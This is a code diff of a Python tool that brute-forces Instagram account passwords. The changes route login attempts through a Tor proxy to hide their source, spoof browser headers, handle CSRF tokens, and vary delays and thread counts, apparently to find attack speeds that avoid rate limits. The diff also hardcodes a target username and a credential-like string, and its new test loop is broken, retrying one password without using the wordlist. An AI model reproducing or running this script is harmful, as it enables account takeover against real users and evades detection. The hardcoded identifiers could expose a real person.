@@ -2,19 +2,37 @@ import requests
 import time
 import sys
 from datetime import datetime
-from colorama import init, Fore, Style
+from colorama import init, Fore
 import concurrent.futures
+import random
+import string
 
 # Initialize colorama
 init(autoreset=True)
 
-# Instagram login function
+# Set up Tor Proxy
+def setup_tor_proxy():
+    session = requests.Session()
+    session.proxies = {
+        'http': 'socks5h://127.0.0.1:9050',
+        'https': 'socks5h://127.0.0.1:9050'
+    }
+    return session
+
+# Instagram login function with CSRF token handling
 def instagram_login(username, password, session):
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
-    # Use the current timestamp for enc_password
-    timestamp = int(datetime.now().timestamp())
+    # Fetch CSRF token by sending a GET request
+    session.get('https://www.instagram.com/accounts/login/')
+    csrf_token = session.cookies.get('csrftoken')
 
+    if not csrf_token:
+        print(Fore.RED + "[-] Could not retrieve CSRF token.")
+        return False
+
+    # Prepare login payload
+    timestamp = int(datetime.now().timestamp())
     payload = {
         'username': username,
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
@@ -22,43 +40,55 @@ def instagram_login(username, password, session):
         'optIntoOneTap': 'false'
     }
 
-    # Get the CSRF token dynamically from the session's cookies
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.instagram.com/accounts/login/',
+        'x-csrftoken': csrf_token
+    }
+
+    # Send POST request for login
     try:
-        response = session.get("https://www.instagram.com/")
-        csrf_token = session.cookies.get('csrftoken')
-
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "X-Requested-With": "XMLHttpRequest",
-            "Referer": "https://www.instagram.com/accounts/login/",
-            "x-csrftoken": csrf_token
-        }
-
-        # Send POST request for login
         login_response = session.post(login_url, data=payload, headers=headers)
-        login_response.raise_for_status()  # Raise an error for bad responses
+        login_response.raise_for_status()  # Raise error for invalid response
 
         response_data = login_response.json()
-        
-        # Check for successful login
         if response_data.get('authenticated', False):
             return True
         else:
             return False
-
     except requests.exceptions.RequestException as e:
         print(Fore.RED + f"[-] Request error: {e}")
         return False
-    except KeyError:
-        print(Fore.RED + "[-] Failed to retrieve CSRF token")
-        return False
-    except Exception as e:
-        print(Fore.RED + f"[-] Unexpected error: {e}")
-        return False
 
-# Main function to handle the bruteforce attack
+# Test function with different delay and concurrency configurations
+def test_speed(username, password, delay, max_workers):
+    print(Fore.GREEN + f"\n[*] Testing with delay = {delay} seconds and max_workers = {max_workers}")
+
+    session = setup_tor_proxy()
+
+    def try_password(password):
+        print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
+        if instagram_login(username, password, session):
+            print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
+            return True
+        else:
+            print(Fore.RED + "Status = [Fail]")
+            return False
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        results = {executor.submit(try_password, password): password for _ in range(2)}  # Test two passwords at once
+        for future in concurrent.futures.as_completed(results):
+            if future.result():
+                print(Fore.GREEN + "[*] Bruteforce attack completed.")
+                return
+
+    time.sleep(delay)
+
+# Main function to test multiple configurations
 def main():
-    username = input("Enter Instagram username to bruteforce: ")
+    username = "meet____z"
+    password = "meetzalavadiya7600948307@instagram.com"
     password_file = "passwords.txt"
 
     try:
@@ -68,36 +98,15 @@ def main():
         print(Fore.RED + f"[-] Error: {password_file} not found.")
         sys.exit(1)
 
-    print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
     print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")
 
-    # Create a session that will persist across multiple requests
-    session = requests.Session()
+    # Test different configurations of delay and max_workers
+    delays = [2, 5, 10, 15, 20]  # Different delay times in seconds
+    max_workers_list = [2, 4, 6, 8]  # Different number of concurrent threads
 
-    # Define a function to attempt login for a given password
-    def try_password(password):
-        print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
-
-        # Attempt login with the current password
-        if instagram_login(username, password, session):
-            print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
-            return True
-        else:
-            print(Fore.RED + "Status = [Fail]")
-            return False
-
-    # Use threading to try 2 passwords at a time
-    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-        # Map the try_password function to all passwords and submit them concurrently
-        results = {executor.submit(try_password, password): password for password in passwords}
-
-        # Wait for the first successful login
-        for future in concurrent.futures.as_completed(results):
-            if future.result():
-                print(Fore.GREEN + "[*] Bruteforce attack completed.")
-                break
-
-    print(Fore.GREEN + "[*] Attack finished or interrupted.")
+    for delay in delays:
+        for max_workers in max_workers_list:
+            test_speed(username, password, delay, max_workers)
 
 if __name__ == "__main__":
     main()
